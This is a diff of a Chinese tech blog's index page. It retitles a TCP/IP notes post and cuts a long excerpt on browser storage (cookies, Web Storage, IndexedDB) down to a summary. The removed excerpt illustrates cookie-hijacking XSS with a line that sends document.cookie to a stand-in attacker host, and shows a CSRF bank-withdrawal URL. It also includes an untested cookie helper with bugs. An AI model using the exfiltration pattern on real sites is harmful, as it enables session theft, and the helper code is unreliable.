@@ -417,7 +417,7 @@
               
                 
                 <a class="post-title-link" href="/2018/04/02/TCP-IP/" itemprop="url">
-                  TCP/IP入门经典_笔记
+                  TCP/IP入门经典_总结
                 </a>
               
             
@@ -471,7 +471,7 @@
 
           
           
-             <span id="/2018/04/02/TCP-IP/" class="leancloud_visitors" data-flag-title="TCP/IP入门经典_笔记">
+             <span id="/2018/04/02/TCP-IP/" class="leancloud_visitors" data-flag-title="TCP/IP入门经典_总结">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -494,10 +494,7 @@
 
       
         
-          <blockquote>
-<p>by MaryTien from <a href="http://luckymona.github.io" target="_blank" rel="noopener">http://luckymona.github.io</a><br>本文地址：<a href="http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css" target="_blank" rel="noopener">http://luckymona.github.io/2016/09/08/summary-of-aligning-to-center-solutions-in-css</a></p>
-</blockquote>
-<p>《TCP/IP入门经典》的读书笔记，总结一下以加深印象。<br></p>
+          <p>本文是对《TCP/IP入门经典》前五章的梳理总结或者说一个读书笔记，主要说明了TCP/IP协议的基础知识、四层模型的结构、每层模型用到的协议，协议的主要内容等。由于篇幅关系，只写到了四层协议中的网络访问层和网际层，计划后续补全。阅读本文可以让你对于互联网的运行基础建立一个大概的印象，为深入了解TCP/IP协议打下基础。</p>
           <div class="post-more-link text-center">
             <a class="btn" href="/2018/04/02/TCP-IP/#more" rel="contents">
               阅读全文 &raquo;
@@ -759,118 +756,12 @@
 
       
         
-          
-            <h1 id="一、cookie"><a href="#一、cookie" class="headerlink" title="一、cookie"></a>一、cookie</h1><p>cookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。</p>
-<h2 id="容量限制"><a href="#容量限制" class="headerlink" title="容量限制"></a>容量限制</h2><ol>
-<li>存储容量较小，每个域名4K左右</li>
-<li>并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条</li>
-<li>超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie</li>
-</ol>
-<h2 id="存储时长"><a href="#存储时长" class="headerlink" title="存储时长"></a>存储时长</h2><ol>
-<li>如果设定了超时时间，cookie将在到期时失效。</li>
-<li><strong>如果没设定，将在关闭浏览器时失效。</strong>在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。<strong>（区别于sessionStorage的Tab级session）</strong></li>
-</ol>
-<h2 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h2><ol>
-<li><p>Session管理：登录、购物车、游戏得分等用户状态</p>
-</li>
-<li><p>保存用户个性化设置，使用偏好、主题等</p>
-</li>
-<li><p>用户跟踪，记录和分析用户行为</p>
-</li>
-</ol>
-<h2 id="使用注意"><a href="#使用注意" class="headerlink" title="使用注意"></a>使用注意</h2><ol>
-<li>因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。</li>
-<li>cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。</li>
-</ol>
-<h2 id="基本API"><a href="#基本API" class="headerlink" title="基本API"></a>基本API</h2><p><strong>后端设置cookie：</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>
-<p>后端接收到前端的请求时，返回一个包含<code>Set-Cookie</code>的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限</p>
-<p><strong>前端设置cookie：</strong><code>document.cookie = &quot;name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]&quot;</code></p>
-<p>因为<code>document.cookie</code>是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如<code>jquery.cookie.js</code>、<code>js.cookie</code>等，下面是我的简单封装（未经调试，只是写下思路）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cookieObj = &#123;</span><br><span class="line">	get:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!keyName)&#123;</span><br><span class="line">  			alert(<span class="string">'superMary says：cookieObj.get need a param！'</span>);</span><br><span class="line">  			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">var</span> encodedKeyName = <span class="built_in">encodeURIComponent</span>(keyName);</span><br><span class="line">		<span class="keyword">var</span> docCookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>);</span><br><span class="line">		<span class="keyword">var</span> resultCookie = docCookieArr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">var</span> cookieArr = item.split(<span class="string">'='</span>);</span><br><span class="line">  			<span class="keyword">return</span> cookieArr[<span class="number">0</span>] === encodedKeyName;</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">if</span>(resultCookie.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  			<span class="keyword">return</span> resultCookie[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		alert(<span class="string">'superMary says：not find the cookie of'</span>+ keyName);		</span><br><span class="line">	&#125;,</span><br><span class="line">	</span><br><span class="line">	set:<span class="function"><span class="keyword">function</span>(<span class="params">oCookie</span>)</span>&#123;</span><br><span class="line">  		<span class="keyword">var</span> cookieStr = <span class="built_in">encodeURIComponent</span>(oCookie.keyName) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(oCookie.keyValue);</span><br><span class="line">  		<span class="keyword">if</span>(oCookie.expires)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';expires='</span> + oCookie.expires;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="keyword">if</span>(oCookie.path)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';path='</span> + oCookie.path;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="keyword">if</span>(oCookie.Domain)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';path='</span> + oCookie.path;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="comment">// secure和httpOnly...</span></span><br><span class="line">	&#125;,</span><br><span class="line">  	delCookie:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>&#123;</span><br><span class="line">  		<span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">      	date.setHours(<span class="number">-1</span>);</span><br><span class="line">      	<span class="keyword">this</span>.set(&#123;</span><br><span class="line">          keyName:keyName,</span><br><span class="line">          expires:date</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>以CSDN网站的cookie为例：</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png" alt="图0_CSDN网站的cookie"></p>
-<p>主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>
-<h3 id="时间类属性-Expires-Max-Age"><a href="#时间类属性-Expires-Max-Age" class="headerlink" title="时间类属性 Expires / Max-Age"></a>时间类属性 Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
-<p>Expires：指定一个GMT格式的绝对时间</p>
-<p>Max-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间</p>
-<h3 id="域类属性-Domain-Path"><a href="#域类属性-Domain-Path" class="headerlink" title="域类属性 Domain / Path"></a>域类属性 Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
-<ol>
-<li><p>表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。</p>
-<p>例：为<a href="http://www.baidu.com/test/testCookie.html" target="_blank" rel="noopener">http://www.baidu.com/test/testCookie.html</a> 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test</p>
-</li>
-<li><p>cookie只能被该Domain域名或其子域名下的页面访问</p>
-</li>
-<li><p>cookie只能被该Path路径或其子路径下的页面访问</p>
-<ol>
-<li><p>二级域名间可以通过设置Domain共享Cookie，实现跨域。</p>
-<p>​例如：a.baidu.com      b.baidu.com<code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="安全类属性-Secure-HttpOnly"><a href="#安全类属性-Secure-HttpOnly" class="headerlink" title="安全类属性 Secure / HttpOnly"></a>安全类属性 Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>
-<p> <strong>Secure</strong>指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。</p>
-<p>注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。</p>
-<p><strong>HttpOnly</strong>设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击</p>
-<p><strong>cookie劫持类XSS攻击</strong></p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png" alt="图1_Xss攻击图解"></p>
-<p>var cookie = document.cookie;</p>
-<p>src=‘<a href="http://www.hacker.com?cookie=’" target="_blank" rel="noopener">www.hacker.com?cookie=’</a> + cookie </p>
-<h3 id="安全类属性-SameSite"><a href="#安全类属性-SameSite" class="headerlink" title="安全类属性 SameSite"></a>安全类属性 SameSite</h3><ol>
-<li>表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。</li>
-<li>可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击</li>
-</ol>
-<p><strong>第三方cookie</strong> </p>
-<p>简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png" alt="图2_第三方cookie"></p>
-<p><strong>CSRF攻击过程</strong></p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png" alt="图3_CSRF攻击"></p>
-<p>src=‘<a href="http://www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’" target="_blank" rel="noopener">www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’</a> </p>
-<p>IE和Safari尚不支持，并且计划版本中也没有加入这个功能</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png" alt="图4_sameSite的浏览器支持情况"></p>
-<h1 id="二、localStorage-sessionStorage"><a href="#二、localStorage-sessionStorage" class="headerlink" title="二、localStorage / sessionStorage"></a>二、localStorage / sessionStorage</h1><p>它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。</p>
-<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>localStorage：会一直保存在浏览器中，除非用户手动清除<br>sessionStorage：存储于浏览器端，<strong>是Tab级别的Session</strong> ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session<br>以下内容均以localStorage作例子</p>
-<h3 id="存储限制"><a href="#存储限制" class="headerlink" title="存储限制"></a>存储限制</h3><p>HTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB</p>
-<h3 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h3><p>IE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48</p>
-<h3 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h3><p>Web Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。</p>
-<h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>
-<h3 id="Storage-Event"><a href="#Storage-Event" class="headerlink" title="Storage Event"></a>Storage Event</h3><p>当向storage中存储数据或移除数据时，会在window对象上触发一个<code>storage event</code>，可以添加监听器进行监听。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'storage'</span>, storageEventHandler, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
-<p><strong>注意</strong><br>事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。<br>只对localStorage 的改变有效，对sessionStorage无效</p>
-<p><strong>用途：</strong><br>可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。</p>
-<h3 id="超出存储限制："><a href="#超出存储限制：" class="headerlink" title="超出存储限制："></a>超出存储限制：</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> ：写入的数据大小超出浏览器的限制就会抛出这个异常<br>最佳实践是，当存储数据时使用try/catch包裹代码块。</p>
-<pre><code>function setSettings() {
-      if (&apos;localStorage&apos; in window &amp;&amp; window[&apos;localStorage&apos;] !== null) {
-          try {
-              localStorage.setItem(&apos;keyName&apos;, &apos;keyValue&apos;);
-          } catch (e) {
-              if (e == QUOTA_EXCEEDED_ERR) {
-                      alert(&apos;Quota exceeded!&apos;);
-                  }
-        }
-     } else {
-          alert(&apos;Cannot store user preferences as your browser do not support local storage&apos;);
-      }
-}
-</code></pre><h2 id="三、客户端数据库"><a href="#三、客户端数据库" class="headerlink" title="三、客户端数据库"></a>三、客户端数据库</h2><p>cookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。</p>
-<p><strong>包括</strong> ：Web SQL Database  / IndexedDB</p>
-<p><strong>访问</strong> ：同域名下可以访问。</p>
-<p><strong>存储时间</strong> ：永久存储，除非用户手动清除数据。</p>
-<p><strong>大小限制</strong> ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。</p>
-<h3 id="Web-SQL-Database"><a href="#Web-SQL-Database" class="headerlink" title="Web SQL Database"></a>Web SQL Database</h3><ol>
-<li>可以处理复杂的关系型数据，并且使用SQL语句进行操作</li>
-<li><p>因为过于依赖后端SQL语言的语法，<strong>已被Web应用工作组废弃</strong> ，但在手机端浏览器中的的支持率仍然较高</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png" alt="图5_Web SQL Database浏览器支持情况"></p>
-</li>
-</ol>
-<p><strong>三个核心方法：</strong><br>openDatabase：创建数据库对象<br>transaction：用于根据情况控制事务提交或回滚<br>executeSql：用于执行SQL 查询</p>
-<h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><ol>
-<li>IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据</li>
-<li>大部分浏览器都已支持或支持部分功能</li>
-</ol>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png" alt="图6_indexedDB浏览器支持情况"></p>
-
-          
+          <p>主要总结了前端常用的客户端存储技术，主要包括Cookie、HTML5 Web Storage，和客户端数据库的内容。</p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/11/11/storage-in-frontent/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
